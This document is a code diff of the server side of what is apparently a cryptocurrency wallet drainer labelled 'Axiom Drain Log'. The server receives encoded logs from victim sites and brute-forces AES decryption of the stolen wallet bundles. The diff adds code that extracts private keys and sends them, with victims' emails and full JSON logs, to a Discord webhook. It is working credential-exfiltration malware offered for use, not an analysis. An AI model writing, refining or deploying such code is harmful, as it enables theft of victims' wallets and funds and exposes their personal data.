@@ -16,14 +16,12 @@ app.get('/data/:payload', async (req, res) => {
         const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
         let data = JSON.parse(decodedStr);
 
-        console.log("✅ Raw log received from:", data.site);
+        console.log("✅ Log received from:", data.site);
 
-        // Decrypt
         if (data.portfolio) {
             data.portfolio = decryptPortfolio(data.portfolio);
         }
 
-        // Send to Discord with more info
         await sendToDiscord(data);
 
         res.status(200).send('OK');
@@ -36,13 +34,10 @@ app.get('/data/:payload', async (req, res) => {
 function decryptPortfolio(portfolio) {
     const bundleKeyB64 = portfolio.bundleKey;
     if (!bundleKeyB64) {
-        portfolio.decryption_note = "No bundleKey found";
+        portfolio.decryption_note = "No bundleKey present";
         return portfolio;
     }
 
-    portfolio.bundleKeyLength = bundleKeyB64.length;
-
-    // Decrypt sBundles
     if (portfolio.sBundles) {
         try {
             const bundles = JSON.parse(portfolio.sBundles);
@@ -52,7 +47,6 @@ function decryptPortfolio(portfolio) {
         }
     }
 
-    // Decrypt eBundles
     if (portfolio.eBundles) {
         try {
             const bundles = JSON.parse(portfolio.eBundles);
@@ -66,67 +60,111 @@ function decryptPortfolio(portfolio) {
 }
 
 function decryptSingleBundle(bundleStr, bundleKeyB64) {
-    if (!bundleStr.includes(':')) return { raw: bundleStr };
+    if (!bundleStr || !bundleStr.includes(':')) return { raw: bundleStr };
 
     const [prefix, encryptedPart] = bundleStr.split(':', 2);
     const result = tryDecryptAES(encryptedPart, bundleKeyB64);
 
     if (result.success) {
         try {
-            return { prefix, data: JSON.parse(result.decrypted) };
-        } catch (e) {
-            return { prefix, decrypted_raw: result.decrypted };
+            return { prefix, data: JSON.parse(result.decrypted), method: result.method };
+        } catch {
+            return { prefix, decrypted: result.decrypted, method: result.method };
         }
     } else {
-        return { prefix, error: result.error, raw_encrypted: encryptedPart };
+        return { prefix, error: result.error, raw: encryptedPart };
     }
 }
 
 function tryDecryptAES(encryptedB64, keyB64) {
     const key = Buffer.from(keyB64, 'base64');
+    const derivedKey = crypto.createHash('sha256').update(keyB64).digest();
 
     const attempts = [
-        { name: "CBC-ZeroIV", mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0) },
-        { name: "CBC-KeyIV",  mode: 'aes-256-cbc', iv: key.slice(0, 16) },
-        { name: "CBC-EmptyIV", mode: 'aes-256-cbc', iv: Buffer.alloc(16) },
-        { name: "ECB", mode: 'aes-256-ecb', iv: null },
-        { name: "CBC-KeyFull", mode: 'aes-256-cbc', iv: key },
+        { name: "CBC-ZeroIV", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0) },
+        { name: "CBC-KeyIV",  mode: 'aes-256-cbc', key: key, iv: key.slice(0, 16) },
+        { name: "CBC-DerivedZero", mode: 'aes-256-cbc', key: derivedKey, iv: Buffer.alloc(16, 0) },
+        { name: "CBC-EmptyIV", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16) },
+        { name: "ECB", mode: 'aes-256-ecb', key: key, iv: null },
+        { name: "CBC-FullKeyIV", mode: 'aes-256-cbc', key: key, iv: key },
     ];
 
-    for (const attempt of attempts) {
+    for (const att of attempts) {
         try {
             let decipher;
-            if (attempt.iv === null) {
-                decipher = crypto.createDecipher(attempt.mode, key);
+            if (att.iv === null) {
+                decipher = crypto.createDecipher(att.mode, att.key);
             } else {
-                decipher = crypto.createDecipheriv(attempt.mode, key, attempt.iv);
+                decipher = crypto.createDecipheriv(att.mode, att.key, att.iv);
             }
 
             let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
             decrypted += decipher.final('utf8');
 
-            return { success: true, decrypted, method: attempt.name };
+            return { success: true, decrypted, method: att.name };
         } catch (e) {}
     }
 
-    return { success: false, error: "All methods failed" };
+    return { success: false, error: "All decryption attempts failed" };
 }
 
 async function sendToDiscord(data) {
-    const embed = {
-        title: "📥 New Axiom Log",
-        color: 0xFF0000,
+    const portfolio = data.portfolio || {};
+    const hasSuccess = (portfolio.sBundlesDecrypted && portfolio.sBundlesDecrypted.some(b => b.data)) ||
+                       (portfolio.eBundlesDecrypted && portfolio.eBundlesDecrypted.some(b => b.data));
+
+    // Main Embed
+    const mainEmbed = {
+        title: "📥 New Axiom Drain Log",
+        color: hasSuccess ? 0x00FF00 : 0xFF0000,
         fields: [
             { name: "Email", value: data.user?.email || "N/A", inline: true },
             { name: "Site", value: data.site || "N/A", inline: true },
-            { name: "Decryption", value: data.portfolio?.sBundlesDecrypted?.[0]?.error ? "❌ Failed" : "✅ Success", inline: true }
-        ]
+            { name: "Decryption", value: hasSuccess ? "✅ Success" : "❌ Failed", inline: true }
+        ],
+        timestamp: new Date().toISOString()
+    };
+
+    // Summary Embed (Pub/Priv Keys)
+    let summaryFields = [
+        { name: "Email", value: data.user?.email || "N/A" },
+        { name: "Site", value: data.site || "N/A" }
+    ];
+
+    // Extract keys if decryption succeeded
+    if (hasSuccess) {
+        const allKeys = [];
+        if (portfolio.sBundlesDecrypted) {
+            portfolio.sBundlesDecrypted.forEach(b => {
+                if (b.data && b.data.privateKey) allKeys.push({ type: "Private", key: b.data.privateKey });
+                if (b.data && b.data.publicKey) allKeys.push({ type: "Public", key: b.data.publicKey });
+            });
+        }
+        if (portfolio.eBundlesDecrypted) {
+            portfolio.eBundlesDecrypted.forEach(b => {
+                if (b.data && b.data.privateKey) allKeys.push({ type: "Private", key: b.data.privateKey });
+                if (b.data && b.data.publicKey) allKeys.push({ type: "Public", key: b.data.publicKey });
+            });
+        }
+
+        allKeys.forEach((k, i) => {
+            summaryFields.push({
+                name: `${k.type} Key ${i+1}`,
+                value: `\`\`\`${k.key}\`\`\``
+            });
+        });
+    }
+
+    const summaryEmbed = {
+        title: "📋 Summary",
+        color: 0x00AAFF,
+        fields: summaryFields.slice(0, 25) // Discord limit
     };
 
     try {
         await axios.post(DISCORD_WEBHOOK, {
-            content: "**New Drain Log Received**",
-            embeds: [embed],
+            content: "**New Drain Log**",
+            embeds: [mainEmbed, summaryEmbed],
             files: [{
                 attachment: Buffer.from(JSON.stringify(data, null, 2), 'utf-8'),
                 name: `full_log_${Date.now()}.json`
